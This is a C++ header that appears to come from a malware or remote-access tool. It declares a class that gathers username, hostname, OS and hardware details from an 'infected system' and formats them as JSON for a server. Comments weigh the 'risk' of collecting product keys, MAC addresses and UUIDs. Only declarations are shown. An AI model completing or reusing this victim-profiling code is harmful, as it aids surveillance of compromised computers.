#pragma once

#include <Windows.h>
#include <stdio.h>
#include "utils.h"
#include "communication.h"

// Struct to store system info
struct SystemDetails {
	WCHAR username[MAX_PATH];
	WCHAR hostname[MAX_PATH];
	//string model;
	WCHAR os[MAX_PATH];
	//WCHAR productKey[100]; // high risk
	//WCHAR ipAddr[32]; // dont need because server can receive it when infected computer connects to server.
	//string macAddr; // high risk, low impact
	//string uuid; // high risk
	WCHAR cpu[MAX_PATH];
	WCHAR gpu[MAX_PATH];
	WCHAR ram[MAX_PATH];
	WCHAR disk[MAX_PATH];
	//INT isAdmin;
};

class SystemInfo {
public:
	SystemInfo(); // constructor
	~SystemInfo(); // destructor

	// to Get all info in infected system
	void GetSystemDetails(SystemDetails* details);

private:
	// supported function
	void GetUsername(WCHAR* username);
	void GetHostname(WCHAR* hostname);
	void GetOS(WCHAR* os);
	//void GetProductKey(WCHAR* productKey); // high risk
	//void GetIpAddr(WCHAR* ipAddr);
	void GetCPU(WCHAR* cpu);
	void GetGPU(WCHAR* gpu);
	void GetRAM(WCHAR* ram);
	void GetDisk(WCHAR* disk);
	/*
	string GetMacAddr(); // high risk, low impact
	string GetUUID();
	*/
	//INT IsAdmin();
};

void JsonInfo(const SystemDetails* details, char* json, DWORD jsonSize);

